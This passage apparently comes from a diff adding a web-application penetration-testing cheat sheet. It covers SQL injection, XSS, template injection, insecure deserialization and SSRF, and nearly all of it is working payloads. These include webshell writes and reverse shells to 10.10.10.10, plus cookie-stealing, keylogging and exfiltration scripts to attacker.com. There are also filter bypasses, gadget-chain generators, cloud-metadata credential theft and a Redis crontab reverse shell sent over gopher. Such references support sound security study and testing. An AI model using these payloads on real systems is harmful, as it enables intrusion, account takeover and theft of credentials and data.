+' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users LIMIT 1)&gt;64-- -
+
+-- Time-based (MySQL)
+' AND IF(1=1, SLEEP(5), 0)-- -
+' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0)-- -
+
+-- Time-based (PostgreSQL)
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
+
+-- Time-based (MSSQL)
+'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
+'; IF (SELECT SUBSTRING(name,1,1) FROM sysusers WHERE uid=1)='d' WAITFOR DELAY '0:0:5'-- -</code></pre>
+
+              <h3 id="sqli-second-order">3.4 Second-Order SQLi</h3>
+              <p>Input is stored safely but used unsafely later. Register a username like <code>admin'--</code>, then trigger a password change that uses the stored username in a raw query.</p>
+              <pre><code class="language-python"># Step 1: Register with malicious username
+requests.post(f"{TARGET}/register", data={
+    "username": "admin'-- ",
+    "password": "password123",
+    "email": "attacker@evil.com"
+})
+
+# Step 2: Login as the new user
+s = requests.Session()
+s.post(f"{TARGET}/login", data={"username": "admin'-- ", "password": "password123"})
+
+# Step 3: Change password - backend query uses stored username unsafely:
+# UPDATE users SET password='new' WHERE username='admin'-- '
+s.post(f"{TARGET}/change-password", data={"new_password": "hacked123"})
+
+# Step 4: Login as admin with the new password
+s.post(f"{TARGET}/login", data={"username": "admin", "password": "hacked123"})</code></pre>
+
+              <h3 id="sqli-orm">3.5 ORM Bypass</h3>
+              <p>ORMs are not immune. Raw query methods, operator injection, and JSON/array parameter manipulation can bypass ORM protections.</p>
+              <pre><code class="language-python"># Django raw SQL (vulnerable)
+User.objects.raw("SELECT * FROM users WHERE name = '%s'" % name)
+
+# Django extra() with injection
+User.objects.extra(where=["name = '%s'" % name])
+
+# SQLAlchemy text() without bind params
+db.session.execute(text("SELECT * FROM users WHERE id = " + user_id))</code></pre>
+              <pre><code class="language-javascript">// Sequelize literal injection
+User.findAll({ where: { name: sequelize.literal(`'${userInput}'`) } });
+
+// MongoDB NoSQL injection (operator injection)
+// POST: {"username": {"$gt": ""}, "password": {"$gt": ""}}
+db.collection('users').findOne({ username: req.body.username, password: req.body.password });</code></pre>
+
+              <h3 id="sqli-db-payloads">3.6 Database-Specific Payloads</h3>
+              <table class="custom-table">
+                <thead><tr><th>Database</th><th>Version</th><th>Current User</th><th>List DBs</th><th>Comments</th></tr></thead>
+                <tbody>
+                  <tr><td>MySQL</td><td><code>@@version</code></td><td><code>user()</code></td><td><code>SELECT schema_name FROM information_schema.schemata</code></td><td><code>-- </code> or <code>#</code></td></tr>
+                  <tr><td>PostgreSQL</td><td><code>version()</code></td><td><code>current_user</code></td><td><code>SELECT datname FROM pg_database</code></td><td><code>-- </code></td></tr>
+                  <tr><td>MSSQL</td><td><code>@@version</code></td><td><code>SYSTEM_USER</code></td><td><code>SELECT name FROM sysdatabases</code></td><td><code>-- </code></td></tr>
+                  <tr><td>Oracle</td><td><code>SELECT banner FROM v$version</code></td><td><code>SELECT user FROM dual</code></td><td><code>SELECT owner FROM all_tables</code></td><td><code>-- </code></td></tr>
+                  <tr><td>SQLite</td><td><code>sqlite_version()</code></td><td>N/A</td><td><code>SELECT name FROM sqlite_master</code></td><td><code>-- </code></td></tr>
+                </tbody>
+              </table>
+
+              <h3 id="sqli-stacked">3.7 Stacked Queries &amp; Stored Procedures</h3>
+              <p>Stacked queries (semicolon-separated) allow arbitrary SQL statements. Support varies by database and driver.</p>
+              <table class="custom-table">
+                <thead><tr><th>Database</th><th>Stacked Queries</th><th>Notes</th></tr></thead>
+                <tbody>
+                  <tr><td>MySQL</td><td>Only with <code>mysqli_multi_query()</code></td><td>Most PHP MySQL drivers do NOT support stacking</td></tr>
+                  <tr><td>PostgreSQL</td><td>Yes (default)</td><td>Works with most drivers</td></tr>
+                  <tr><td>MSSQL</td><td>Yes (default)</td><td>Works with most drivers</td></tr>
+                  <tr><td>SQLite</td><td>Yes</td><td>Works in most contexts</td></tr>
+                  <tr><td>Oracle</td><td>No</td><td>Use UNION or error-based instead</td></tr>
+                </tbody>
+              </table>
+              <pre><code class="language-sql">-- MSSQL: enable xp_cmdshell via stacked queries
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
+'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+'; EXEC xp_cmdshell 'whoami';--
+
+-- PostgreSQL: create a table, insert data, exfil via error
+'; CREATE TABLE IF NOT EXISTS exfil(data text);--
+'; INSERT INTO exfil SELECT version();--
+'; SELECT 1/0 FROM exfil;--  -- error leaks data
+
+-- MySQL (if multi-query enabled): create UDF
+'; CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';--
+'; SELECT sys_exec('id');--</code></pre>
+
+              <h3 id="sqli-automation">3.8 Automation with sqlmap</h3>
+              <pre><code class="language-bash"># Basic detection
+sqlmap -u "http://target/page?id=1" --batch
+
+# With authentication cookie
+sqlmap -u "http://target/api/search?q=test" --cookie="session=abc123" --batch
+
+# POST request
+sqlmap -u "http://target/login" --data="user=admin&amp;pass=test" --batch
+
+# Specify injection point with *
+sqlmap -u "http://target/api/search" --data='{"query":"test*"}' --batch
+
+# Enumerate
+sqlmap -u "http://target/page?id=1" --dbs              # list databases
+sqlmap -u "http://target/page?id=1" -D mydb --tables    # list tables
+sqlmap -u "http://target/page?id=1" -D mydb -T users --dump  # dump table
+
+# OS shell (if FILE priv or stacked queries)
+sqlmap -u "http://target/page?id=1" --os-shell
+sqlmap -u "http://target/page?id=1" --os-cmd="whoami"
+
+# File read/write
+sqlmap -u "http://target/page?id=1" --file-read="/etc/passwd"
+sqlmap -u "http://target/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+# Specify technique (B=boolean, T=time, U=union, E=error, S=stacked)
+sqlmap -u "http://target/page?id=1" --technique=BT --batch</code></pre>
+
+              <h3 id="sqli-to-rce">3.9 SQLi to RCE</h3>
+              <pre><code class="language-sql">-- MySQL: write webshell via INTO OUTFILE
+' UNION SELECT '&lt;?php system($_GET["c"]);?&gt;' INTO OUTFILE '/var/www/html/shell.php'-- -
+-- Requires FILE privilege and secure_file_priv="" or writable path
+
+-- PostgreSQL: write file via COPY
+'; COPY (SELECT '&lt;?php system($_GET["c"]);?&gt;') TO '/var/www/html/shell.php';-- -
+
+-- PostgreSQL: command execution via COPY TO PROGRAM (9.3+)
+'; COPY cmd_output FROM PROGRAM 'id';-- -
+'; CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM 'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1"';-- -
+
+-- MSSQL: enable and use xp_cmdshell
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;-- -
+'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -
+'; EXEC xp_cmdshell 'whoami';-- -
+'; EXEC xp_cmdshell 'powershell -e &lt;base64_payload&gt;';-- -
+
+-- PostgreSQL: UDF / extension RCE
+-- Compile a shared library with a command execution function, upload via lo_import
+'; SELECT lo_import('/tmp/evil.so', 1337);-- -
+'; CREATE OR REPLACE FUNCTION cmd(text) RETURNS text AS '/tmp/evil.so','cmd' LANGUAGE C;-- -
+'; SELECT cmd('id');-- -</code></pre>
+
+              <!-- ============================================================ -->
+              <!-- Section 4: Cross-Site Scripting (XSS)                        -->
+              <!-- ============================================================ -->
+              <h2 id="xss">4. Cross-Site Scripting (XSS)</h2>
+              <p>XSS injects client-side script into web pages viewed by other users. In source code review, look for any user input rendered without encoding in HTML, JavaScript, or attribute contexts.</p>
+
+              <h3 id="xss-reflected">4.1 Reflected XSS</h3>
+              <pre><code class="language-bash"># Basic payloads
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+
+# Event handler injection in attributes
+" onfocus=alert(1) autofocus="
+' onfocus=alert(1) autofocus='
+" onmouseover=alert(1) "
+
+# JavaScript context breakout
+';alert(1)//
+"-alert(1)-"
+\'-alert(1)//</code></pre>
+
+              <h3 id="xss-stored">4.2 Stored XSS</h3>
+              <p>Stored XSS persists in the database and fires for every user who views the affected page. Common injection points: profile fields, comments, filenames, email headers, and log viewers.</p>
+              <pre><code class="language-javascript">// Cookie stealer
+&lt;script&gt;new Image().src="http://attacker.com/steal?c="+document.cookie&lt;/script&gt;
+
+// Fetch-based exfiltration (bypasses some CSP)
+&lt;script&gt;
+fetch("http://attacker.com/log", {
+  method: "POST",
+  body: document.cookie
+});
+&lt;/script&gt;
+
+// Keylogger injection
+&lt;script&gt;
+document.onkeypress = function(e) {
+  new Image().src = "http://attacker.com/keys?k=" + e.key;
+};
+&lt;/script&gt;</code></pre>
+
+              <h3 id="xss-dom">4.3 DOM-Based XSS</h3>
+              <p>DOM XSS never hits the server. Vulnerable sinks include <code>innerHTML</code>, <code>document.write()</code>, <code>eval()</code>, and <code>location.href</code>. Sources: <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>window.name</code>, <code>postMessage</code>.</p>
+              <pre><code class="language-javascript">// Vulnerable DOM sink examples
+document.getElementById("output").innerHTML = location.hash.slice(1);
+document.write("&lt;h1&gt;" + decodeURIComponent(location.search) + "&lt;/h1&gt;");
+eval("var x = '" + location.hash.slice(1) + "'");
+jQuery("#div").html(userInput);
+$(".target").append(userInput);
+
+// Exploit: http://target/#&lt;img src=x onerror=alert(1)&gt;</code></pre>
+
+              <h3 id="xss-filter-bypass">4.4 Filter Bypass Techniques</h3>
+              <table class="custom-table">
+                <thead><tr><th>Filter</th><th>Bypass</th></tr></thead>
+                <tbody>
+                  <tr><td>Blocks <code>&lt;script&gt;</code></td><td><code>&lt;ScRiPt&gt;</code>, <code>&lt;scr&lt;script&gt;ipt&gt;</code>, <code>&lt;img src=x onerror=...&gt;</code></td></tr>
+                  <tr><td>Blocks <code>alert</code></td><td><code>confirm(1)</code>, <code>prompt(1)</code>, <code>window['al'+'ert'](1)</code></td></tr>
+                  <tr><td>Blocks parentheses</td><td><code>alert`1`</code> (template literals), <code>onerror=alert</code> (implicit arg)</td></tr>
+                  <tr><td>Blocks quotes</td><td><code>String.fromCharCode(88,83,83)</code>, <code>/regex/.source</code></td></tr>
+                  <tr><td>Blocks spaces</td><td><code>&lt;svg/onload=alert(1)&gt;</code>, <code>/**/</code> as separator</td></tr>
+                  <tr><td>HTML entity encoding</td><td><code>&amp;lt;script&amp;gt;</code> in attribute context may decode</td></tr>
+                  <tr><td>URL encoding</td><td>Double-encode: <code>%253Cscript%253E</code></td></tr>
+                  <tr><td>Null byte</td><td><code>&lt;scri%00pt&gt;</code> (older parsers)</td></tr>
+                </tbody>
+              </table>
+
+              <h3 id="xss-csp-bypass">4.5 CSP Bypass</h3>
+              <pre><code class="language-bash"># If CSP allows 'unsafe-inline' (common misconfiguration)
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+# If CSP allows a CDN with JSONP endpoints
+&lt;script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"&gt;&lt;/script&gt;
+
+# If CSP allows 'self' and you can upload files
+# Upload a .js file, reference it: &lt;script src="/uploads/evil.js"&gt;&lt;/script&gt;
+
+# Base tag injection (if base-uri not restricted)
+&lt;base href="http://attacker.com/"&gt;
+# All relative script/link paths now load from attacker
+
+# CSP with nonce leak via injection in same page
+# If nonce is reflected: &lt;script nonce="LEAKED_NONCE"&gt;alert(1)&lt;/script&gt;
+
+# meta tag redirect (data exfil if CSP allows)
+&lt;meta http-equiv="refresh" content="0;url=http://attacker.com/?c="+document.cookie&gt;</code></pre>
+
+              <h3 id="xss-account-takeover">4.6 XSS to Account Takeover</h3>
+              <pre><code class="language-javascript">// Steal session and exfil
+&lt;script&gt;
+fetch('/api/me').then(r =&gt; r.text()).then(d =&gt; {
+  fetch('http://attacker.com/exfil', {method:'POST', body: d});
+});
+&lt;/script&gt;
+
+// Change admin password via XSS
+&lt;script&gt;
+fetch('/api/change-password', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({new_password: 'hacked123'})
+});
+&lt;/script&gt;
+
+// Create new admin account via stored XSS
+&lt;script&gt;
+fetch('/admin/create-user', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'username=backdoor&amp;password=backdoor&amp;role=admin'
+});
+&lt;/script&gt;</code></pre>
+
+              <!-- ============================================================ -->
+              <!-- Section 5: Server-Side Template Injection                    -->
+              <!-- ============================================================ -->
+              <h2 id="ssti">5. Server-Side Template Injection</h2>
+              <p>SSTI occurs when user input is embedded directly into a server-side template string rather than passed as a data variable. Detection starts with injecting math expressions and observing whether the server evaluates them.</p>
+
+              <h3 id="ssti-detection">5.1 Detection Methodology</h3>
+              <pre><code class="language-bash"># Universal detection payloads
+{{7*7}}          # Jinja2, Twig, Freemarker, Pebble
+${7*7}           # Freemarker, Mako, EL
+#{7*7}           # Ruby ERB, Pebble, Thymeleaf
+&lt;%= 7*7 %&gt;       # ERB (Ruby), EJS (Node.js)
+${{7*7}}         # Pebble
+{{7*'7'}}        # Jinja2 returns "7777777", Twig returns "49"
+
+# Differentiation tree:
+# {{7*7}}=49 -&gt; try {{7*'7'}}
+#   "7777777" -&gt; Jinja2
+#   "49"      -&gt; Twig
+# ${7*7}=49  -&gt; Freemarker or Mako
+# #{7*7}=49  -&gt; Thymeleaf or EL</code></pre>
+
+              <h3 id="ssti-jinja2">5.2 Jinja2 (Python)</h3>
+              <pre><code class="language-python"># Read file
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+# Find subprocess.Popen index, then:
+{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('cat /etc/passwd', shell=True, stdout=-1).communicate() }}
+
+# RCE via config object
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+
+# RCE via cycler (shorter)
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+
+# RCE via lipsum
+{{ lipsum.__globals__["os"].popen("id").read() }}
+
+# Reverse shell
+{{ lipsum.__globals__["os"].popen("bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1'").read() }}</code></pre>
+
+              <h3 id="ssti-twig">5.3 Twig (PHP)</h3>
+              <pre><code class="language-php">// RCE via filter
+{{['id']|filter('system')}}
+{{['cat /etc/passwd']|filter('exec')}}
+
+// RCE via map
+{{['id']|map('system')}}
+
+// RCE via sort (Twig 1.x)
+{{['id']|sort('passthru')}}
+
+// File read
+{{'/etc/passwd'|file_excerpt(0,100)}}</code></pre>
+
+              <h3 id="ssti-freemarker">5.4 Freemarker (Java)</h3>
+              <pre><code class="language-java">// RCE via Execute
+&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("id")}
+
+// RCE via ObjectConstructor
+&lt;#assign classloader=object?api.class.protectionDomain.classLoader&gt;
+${classloader.loadClass("java.lang.Runtime").getMethod("exec","".class).invoke(classloader.loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
+
+// File read
+${object?api.class.getResource("/etc/passwd").getContent()}</code></pre>
+
+              <h3 id="ssti-pebble">5.5 Pebble (Java)</h3>
+              <pre><code class="language-java">// RCE
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
+{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes, 'UTF-8') }}</code></pre>
+
+              <h3 id="ssti-other">5.6 Other Engines</h3>
+              <pre><code class="language-bash"># Mako (Python)
+${__import__('os').popen('id').read()}
+&lt;% import os; os.system('id') %&gt;
+
+# ERB (Ruby)
+&lt;%= system('id') %&gt;
+&lt;%= `id` %&gt;
+&lt;%= IO.popen('id').read %&gt;
+
+# EJS (Node.js)
+&lt;%= process.mainModule.require('child_process').execSync('id').toString() %&gt;
+
+# Thymeleaf (Java) - expression injection in URLs/fragments
+${T(java.lang.Runtime).getRuntime().exec('id')}
+__${T(java.lang.Runtime).getRuntime().exec('id')}__::x
+
+# Velocity (Java)
+#set($x='')##
+#set($rt=$x.class.forName('java.lang.Runtime'))##
+#set($chr=$x.class.forName('java.lang.Character'))##
+#set($str=$x.class.forName('java.lang.String'))##
+#set($ex=$rt.getRuntime().exec('id'))##
+
+# Smarty (PHP)
+{php}system('id');{/php}               -- Smarty 2.x only
+{system('id')}                          -- if security policy allows
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"&lt;?php passthru($_GET['c']); ?&gt;",self::clearConfig())}</code></pre>
+
+              <h3 id="ssti-filter-bypass">5.7 SSTI Filter Bypass</h3>
+              <table class="custom-table">
+                <thead><tr><th>Filter</th><th>Bypass (Jinja2)</th></tr></thead>
+                <tbody>
+                  <tr><td>Blocks <code>.</code> (dot)</td><td><code>{{ config['__class__'] }}</code> or <code>{{ config|attr('__class__') }}</code></td></tr>
+                  <tr><td>Blocks <code>_</code> (underscore)</td><td><code>{{ ''['\x5f\x5fclass\x5f\x5f'] }}</code></td></tr>
+                  <tr><td>Blocks <code>[]</code></td><td><code>{{ config.__class__ }}</code> (use dot notation)</td></tr>
+                  <tr><td>Blocks <code>'</code> and <code>"</code></td><td><code>{{ config|attr(request.args.x) }}</code> with <code>?x=__class__</code></td></tr>
+                  <tr><td>Blocks <code>config</code></td><td><code>{{ self.__init__.__globals__ }}</code></td></tr>
+                  <tr><td>Blocks <code>os</code></td><td><code>{{ lipsum.__globals__['\x6f\x73'] }}</code></td></tr>
+                  <tr><td>Sandbox mode</td><td>Use <code>|attr()</code> filter chains to traverse MRO</td></tr>
+                </tbody>
+              </table>
+              <pre><code class="language-python"># Jinja2: bypass without dots or underscores
+{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}
+
+# Jinja2: bypass using request object
+{{ ''[request.args.a][request.args.b][1][request.args.c]() }}
+# URL: ?a=__class__&amp;b=__mro__&amp;c=__subclasses__
+
+# Jinja2: bypass using |attr filter
+{{ ''|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')() }}
+
+# Twig: bypass using filter array notation
+{{ ['id']|filter('system') }}
+{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}</code></pre>
+
+              <!-- ============================================================ -->
+              <!-- Section 6: Insecure Deserialization                          -->
+              <!-- ============================================================ -->
+              <h2 id="deserialization">6. Insecure Deserialization</h2>
+              <p>Deserialization vulnerabilities occur when untrusted data is passed to a deserialize function. The attacker crafts a serialized object that triggers dangerous operations (RCE, file access) during or after deserialization.</p>
+
+              <h3 id="deser-php">6.1 PHP (unserialize)</h3>
+              <p>PHP <code>unserialize()</code> instantiates objects and calls magic methods (<code>__wakeup</code>, <code>__destruct</code>, <code>__toString</code>). Chain gadgets from application classes or frameworks.</p>
+              <pre><code class="language-php">// Vulnerable code
+$obj = unserialize($_COOKIE['data']);
+
+// Gadget chain: find a class with __destruct or __wakeup that calls dangerous functions
+// Example: class with __destruct that writes to a file
+class LogWriter {
+    public $filename;
+    public $data;
+    function __destruct() {
+        file_put_contents($this->filename, $this->data);
+    }
+}
+// Payload: serialize object to write a webshell
+$payload = new LogWriter();
+$payload-&gt;filename = "/var/www/html/shell.php";
+$payload-&gt;data = "&lt;?php system(\$_GET['c']); ?&gt;";
+echo serialize($payload);
+// O:9:"LogWriter":2:{s:8:"filename";s:25:"/var/www/html/shell.php";s:4:"data";s:28:"&lt;?php system($_GET['c']); ?&gt;";}</code></pre>
+              <pre><code class="language-bash"># PHPGGC: generate gadget chain payloads for common frameworks
+phpggc -l                                    # list available chains
+phpggc Laravel/RCE1 system id               # Laravel RCE
+phpggc Symfony/RCE4 system id               # Symfony RCE
+phpggc WordPress/RCE1 system id             # WordPress RCE
+phpggc Magento/FW1 /var/www/html/shell.php shell_content  # file write</code></pre>
+
+              <h3 id="deser-java">6.2 Java (ysoserial)</h3>
+              <p>Java deserialization (<code>ObjectInputStream.readObject()</code>) is exploitable when gadget classes exist on the classpath. Use ysoserial to generate payloads.</p>
+              <pre><code class="language-bash"># Generate payloads with ysoserial
+java -jar ysoserial.jar CommonsCollections1 'id' &gt; payload.bin
+java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaS...|{base64,-d}|bash}' &gt; payload.bin
+
+# Common gadget chains
+java -jar ysoserial.jar CommonsCollections1 'CMD'   # Apache Commons Collections 3.x
+java -jar ysoserial.jar CommonsCollections6 'CMD'   # Apache Commons Collections 4.x
+java -jar ysoserial.jar CommonsCollections7 'CMD'   # CC 3.x (no InvokerTransformer)
+java -jar ysoserial.jar CommonsBeanutils1 'CMD'     # Apache Commons Beanutils
+java -jar ysoserial.jar Spring1 'CMD'               # Spring Framework
+java -jar ysoserial.jar Hibernate1 'CMD'            # Hibernate
+
+# Base64 encode for HTTP transport
+java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0
+
+# Detect Java serialization: magic bytes AC ED 00 05 (hex) or rO0AB (base64)</code></pre>
+
+              <h3 id="deser-python">6.3 Python (pickle)</h3>
+              <pre><code class="language-python">import pickle, base64, os
+
+# Malicious class with __reduce__ for RCE
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('id',))
+
+# Generate payload
+payload = base64.b64encode(pickle.dumps(Exploit()))
+print(payload.decode())
+
+# Reverse shell payload
+class ReverseShell:
+    def __reduce__(self):
+        return (os.system, ('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1"',))
+
+payload = base64.b64encode(pickle.dumps(ReverseShell()))
+print(payload.decode())
+
+# Also vulnerable: yaml.load() without SafeLoader
+import yaml
+yaml.load('!!python/object/apply:os.system ["id"]')  # RCE</code></pre>
+
+              <h3 id="deser-dotnet">6.4 .NET (BinaryFormatter, Json.NET)</h3>
+              <pre><code class="language-bash"># ysoserial.net - generate .NET deserialization payloads
+ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" -o base64
+ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c calc" -o raw
+ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "powershell -e &lt;b64&gt;" -o base64
+
+# Common .NET gadget chains
+# TypeConfuseDelegate    - BinaryFormatter / SoapFormatter
+# ObjectDataProvider     - Json.NET, XmlSerializer
+# WindowsIdentity        - BinaryFormatter
+# TextFormattingRunProps  - BinaryFormatter (no cmd.exe dependency)
+# ActivitySurrogateSelector - BinaryFormatter</code></pre>
+              <pre><code class="language-csharp">// Vulnerable: BinaryFormatter on untrusted input
+BinaryFormatter bf = new BinaryFormatter();
+object obj = bf.Deserialize(requestStream);   // RCE if gadget chain present
+
+// Vulnerable: Json.NET with TypeNameHandling
+JsonConvert.DeserializeObject&lt;object&gt;(json, new JsonSerializerSettings {
+    TypeNameHandling = TypeNameHandling.All  // attacker controls type
+});
+
+// Vulnerable: ViewState without MAC validation
+// __VIEWSTATE parameter can contain serialized gadget chain</code></pre>
+
+              <h3 id="deser-nodejs">6.5 Node.js</h3>
+              <pre><code class="language-javascript">// node-serialize: vulnerable to IIFE in serialized data
+var serialize = require('node-serialize');
+// Payload with IIFE (Immediately Invoked Function Expression)
+var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(e,o){/* callback */})}()"}';
+serialize.unserialize(payload);
+
+// cryo: another vulnerable serialization library
+// Exploit via __proto__ pollution + constructor override
+var cryo = require('cryo');
+var payload = '{"__proto__":{"toString":"_$$ND_FUNC$$_function(){return require(\'child_process\').execSync(\'id\').toString()}"}}';
+cryo.parse(payload);</code></pre>
+
+              <h3 id="deser-detection">6.6 Detection &amp; Identification</h3>
+              <table class="custom-table">
+                <thead><tr><th>Format</th><th>Magic Bytes / Indicators</th></tr></thead>
+                <tbody>
+                  <tr><td>Java serialized</td><td><code>AC ED 00 05</code> (hex) or <code>rO0AB</code> (base64)</td></tr>
+                  <tr><td>PHP serialized</td><td><code>O:</code> (object), <code>a:</code> (array), <code>s:</code> (string) at start</td></tr>
+                  <tr><td>.NET BinaryFormatter</td><td><code>00 01 00 00 00 FF FF FF FF</code> or <code>AAEAAAD/////</code> (base64)</td></tr>
+                  <tr><td>.NET ViewState</td><td><code>__VIEWSTATE</code> parameter, starts with <code>/w</code> (base64)</td></tr>
+                  <tr><td>Python pickle</td><td><code>\x80\x03</code> (protocol 3), <code>\x80\x04</code> (protocol 4), <code>\x80\x05</code> (protocol 5)</td></tr>
+                  <tr><td>YAML</td><td>Look for <code>!!python/object</code>, <code>!!python/apply</code> tags</td></tr>
+                  <tr><td>JSON (typed)</td><td><code>$type</code> (Json.NET), <code>@class</code> (Jackson), <code>__type</code> (WCF)</td></tr>
+                </tbody>
+              </table>
+              <pre><code class="language-bash"># Where to find serialized data
+# - Cookies (especially Java JSESSIONID, .NET ViewState)
+# - Hidden form fields
+# - API request/response bodies
+# - WebSocket messages
+# - Message queues (RabbitMQ, Redis)
+# - Database BLOBs
+# - File uploads
+
+# Quick detection in HTTP traffic (Burp)
+# Search for base64-encoded AC ED or rO0AB in cookies/params
+# Check for Content-Type: application/x-java-serialized-object
+# Look for __VIEWSTATE in .NET applications</code></pre>
+
+              <!-- ============================================================ -->
+              <!-- Section 7: SSRF                                              -->
+              <!-- ============================================================ -->
+              <h2 id="ssrf">7. SSRF</h2>
+              <p>Server-Side Request Forgery makes the server issue HTTP requests to attacker-chosen destinations, typically internal services or cloud metadata endpoints that are unreachable from outside.</p>
+
+              <h3 id="ssrf-basic">7.1 Basic SSRF</h3>
+              <pre><code class="language-bash"># Common vulnerable parameters
+url=http://127.0.0.1/admin
+image_url=http://localhost:8080/internal
+webhook=http://169.254.169.254/
+redirect=http://[::1]/admin
+proxy=http://internal-service.local/secret
+
+# File protocol
+url=file:///etc/passwd
+url=file:///c:/windows/system32/drivers/etc/hosts
+
+# Gopher protocol (craft arbitrary TCP packets)
+url=gopher://127.0.0.1:3306/_payload
+url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a</code></pre>
+
+              <h3 id="ssrf-filter-bypass">7.2 Filter Bypass</h3>
+              <table class="custom-table">
+                <thead><tr><th>Technique</th><th>Payload</th></tr></thead>
+                <tbody>
+                  <tr><td>Decimal IP</td><td><code>http://2130706433</code> (= 127.0.0.1)</td></tr>
+                  <tr><td>Hex IP</td><td><code>http://0x7f000001</code></td></tr>
+                  <tr><td>Octal IP</td><td><code>http://0177.0.0.1</code></td></tr>
+                  <tr><td>IPv6 loopback</td><td><code>http://[::1]</code> or <code>http://[0:0:0:0:0:ffff:127.0.0.1]</code></td></tr>
+                  <tr><td>Subdomain trick</td><td><code>http://127.0.0.1.nip.io</code></td></tr>
+                  <tr><td>DNS rebinding</td><td>Domain resolves to external IP first, then 127.0.0.1</td></tr>
+                  <tr><td>URL encoding</td><td><code>http://127.0.0.1%2f@attacker.com</code></td></tr>
+                  <tr><td>Redirect chain</td><td>Attacker URL 302-redirects to <code>http://127.0.0.1</code></td></tr>
+                  <tr><td>Short URL</td><td><code>http://127.1</code> or <code>http://0</code></td></tr>
+                  <tr><td>Enclosed brackets</td><td><code>http://[::ffff:127.0.0.1]</code></td></tr>
+                </tbody>
+              </table>
+              <pre><code class="language-python"># DNS rebinding: set up a domain that alternates between external and internal IP
+# First resolution: &lt;your_ip&gt; (passes allowlist check)
+# Second resolution: 127.0.0.1 (actual request hits localhost)
+# Tools: rbndr.us, singularity, rebinder
+
+# Redirect-based bypass
+# Host a redirect on your server:
+from flask import Flask, redirect
+app = Flask(__name__)
+
+@app.route('/redirect')
+def redir():
+    return redirect('http://169.254.169.254/latest/meta-data/', code=302)</code></pre>
+
+              <h3 id="ssrf-cloud-metadata">7.3 Cloud Metadata Endpoints</h3>
+              <pre><code class="language-bash"># AWS IMDSv1
+curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+# Returns: AccessKeyId, SecretAccessKey, Token
+
+# AWS IMDSv2 (requires token header)
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
+
+# GCP
+curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure
+curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/"
+
+# DigitalOcean
+curl http://169.254.169.254/metadata/v1/</code></pre>
+
+              <h3 id="ssrf-gopher">7.4 Gopher Protocol Exploitation</h3>
+              <p>The gopher protocol lets you craft arbitrary TCP packets, making it possible to interact with internal services (Redis, MySQL, SMTP, FastCGI) through SSRF.</p>
+              <pre><code class="language-bash"># Generate gopher payloads with Gopherus
+python gopherus.py --exploit redis
+python gopherus.py --exploit mysql
+python gopherus.py --exploit fastcgi
+python gopherus.py --exploit smtp
+
+# Manual Redis gopher payload (write crontab for reverse shell)
+gopher://127.0.0.1:6379/_
+*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0a1%0d%0a$57%0d%0a
+%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1%0a
